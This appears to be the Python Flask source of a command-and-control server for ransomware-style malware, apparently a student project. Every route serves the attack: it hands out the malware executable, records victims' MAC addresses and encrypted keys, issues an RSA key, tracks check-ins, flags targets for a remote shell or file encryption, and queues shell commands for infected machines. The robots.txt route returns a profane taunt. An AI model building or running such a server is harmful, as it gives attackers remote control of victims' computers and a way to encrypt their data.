from flask import Flask, send_file, request
import os
import csv
import datetime
import pandas as pan
from Crypto.PublicKey import RSA



app = Flask(__name__)
"""
Route: N/a
Request: GET
Args: N/A
"""
@app.route("/")
def home():
    return "Hello, World!"


"""
Route: robots.txt
Request: GET
Args: N/A
Action: reply bad words
"""
@app.route("/robots.txt", methods=['GET'])
def test():
    return "FUCK YOU H$CK3R I am just making a skool Project!"



"""
Route: Download
Request: GET
Args: N/A
Action: Downlaods the executable file of the malware to the target
"""
@app.route("/Download",  methods=['GET'])
def downloadFile ():
    #For windows you need to use drive name [ex: F:/Example.pdf]
    path = "a.out"
    return send_file(path, as_attachment=True)



"""
Route: SendMacEncKey
Request: POST
Args: 
    Mac: Mac address of the computer 
    Enc: AES encrypted priv key with the public key and base64.
Action: target sends the Mac addy and the encrypted key 
"""
@app.route("/SendMacEncKey",  methods=['POST'])
def StoreEncKey ():
    datas = ""
    try:
        MacAddy = request.form['Mac']
        EncKey  = request.form['EncKey']
        time    = datetime.datetime.now()
        Shell   = 0
        Encrypt = 0
    except RuntimeError as err:
        print("Error")
    
    fields=[MacAddy, EncKey, time, Shell, Encrypt ]
    if os.path.isfile('Infodb.csv'):
        print ("Using known Info db")
        found = False
        with open('Infodb.csv', 'r', newline='') as file:
            reader = csv.reader(file)
            for row in reader:
                if MacAddy in row[0]:
                    found = True
                    break
        file.close()
        if found == False:
            with open('Infodb.csv', 'a', newline='') as file:
                writer = csv.writer(file)
                writer.writerow(fields)
    else:
        print("Generating new Info db")
        with open('Infodb.csv', 'w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(["MacAddress", "AESkey", "LastAccess", "Shell", "Encrypt", "Cmd1", "Cmd2", "Rsp1", "Rsp2", "Read"])
            writer.writerow(fields)
    file.close()
    return "merp"
    


"""
Route: GetKey
Request: GET
Args: N/A
Action: target receives a public key
"""
@app.route("/GetKey",  methods=['GET'])
def getKey():
    if os.path.isfile('RSAMalwareKey.pem'):
        print ("Using known private key file")
        f = open('RSAMalwareKey.pem','r')
        key = RSA.importKey(f.read())
        f.close()
    else:
        print("Generating new private key")
        key = RSA.generate(2048)
        print (key.exportKey('PEM'))
        f = open('RSAMalwareKey.pem','wb')
        f.write(key.exportKey('PEM'))
        f.close()
    # pubKey = key.publickey()
    # privKey = key.exportKey('PEM')
    #return key
    return key.publickey().exportKey('PEM')
    


"""
Route: Status
Request: GET
Args: 
    Mac: Mac address
Action: Lets the C2 server know every minute that we are online, Returns Shell info, if data returned = 0 do shell other wise 1
and the second zero is if you should encrypt or not. 0 for no and 1 for yes
"""
@app.route("/Status",  methods=['GET'])
def status():
    MacAddy = request.args["Mac"]
    if os.path.isfile('Infodb.csv'):
        print ("Using known Info db")
        csv = pan.read_csv("Infodb.csv")
        if csv.loc[csv["MacAddress"]==MacAddy].empty == False:
            csv.loc[csv["MacAddress"]==MacAddy, "LastAccess"] = datetime.datetime.now()
            csv.to_csv('Infodb.csv', index=False)
            shell = csv.loc[csv["MacAddress"]==MacAddy, 'Shell'].at[0]
            Enc   = csv.loc[csv["MacAddress"]==MacAddy, 'Encrypt'].at[0]
            print (Enc)
            return str(shell) + " " + str(Enc)
        return "Mac not found"
    else: 
        return "Nothing Homie, Send Mac"


"""
Route: GetCommand
Request: GET
Args: 
    Mac: Mac address
Action: 
"""
@app.route("/GetCommand",  methods=['GET'])
def Bash():
    MacAddy = request.args["Mac"]
    csv = pan.read_csv("Infodb.csv")
    if csv.loc[csv["MacAddress"]==MacAddy].empty == False:
        csv.loc[csv["MacAddress"]==MacAddy, "LastAccess"] = datetime.datetime.now()
        if (csv.loc[csv["MacAddress"]==MacAddy, 'Read'].at[0] == 1):
            cmd = csv.loc[csv["MacAddress"]==MacAddy, 'Cmd1'].at[0]
            csv.loc[csv["MacAddress"]==MacAddy, 'Cmd1'] = csv.loc[csv["MacAddress"]==MacAddy, 'Cmd2']
            csv.loc[csv["MacAddress"]==MacAddy, 'Cmd2'] = ""
            # if we just but an empty cell into CMD1 then it will be empty too and we should drop the read
            if (csv.loc[csv["MacAddress"]==MacAddy, "Cmd1" ].dropna().empty):
                print("Inside")
                csv.loc[csv["MacAddress"]==MacAddy, 'Read'] = 0
            csv.to_csv("Infodb.csv", index=False)
            return str(cmd)
        return "No Commands"
    return "Mac not found"

"""
Route: 
Request: GET
Args: 
    Mac: Mac address
    Data: Command Reply
Action: 
"""
@app.route("/CommandReply",  methods=['POST'])
def CmdRep():
    MacAddy = request.form['Mac']
    data    = request.form['Data']
    csv = pan.read_csv("Infodb.csv")
    if csv.loc[csv["MacAddress"]==MacAddy].empty == False:
        csv.loc[csv["MacAddress"]==MacAddy, "LastAccess"] = datetime.datetime.now()
        if (csv.loc[csv["MacAddress"]==MacAddy, 'Read'].at[0] == 1):
            cmd = csv.loc[csv["MacAddress"]==MacAddy, 'Cmd1'].at[0]
            csv.loc[csv["MacAddress"]==MacAddy, 'Cmd1'] = csv.loc[csv["MacAddress"]==MacAddy, 'Cmd2']
            csv.loc[csv["MacAddress"]==MacAddy, 'Cmd2'] = ""
            # if we just but an empty cell into CMD1 then it will be empty too and we should drop the read
            if (csv.loc[csv["MacAddress"]==MacAddy, "Cmd1" ].dropna().empty):
                print("Inside")
                csv.loc[csv["MacAddress"]==MacAddy, 'Read'] = 0
            csv.to_csv("Infodb.csv", index=False)
            return str(cmd)
        return "No Commands"
    return "Mac not found"



if __name__ == "__main__":
    app.run(debug=True, port=5000)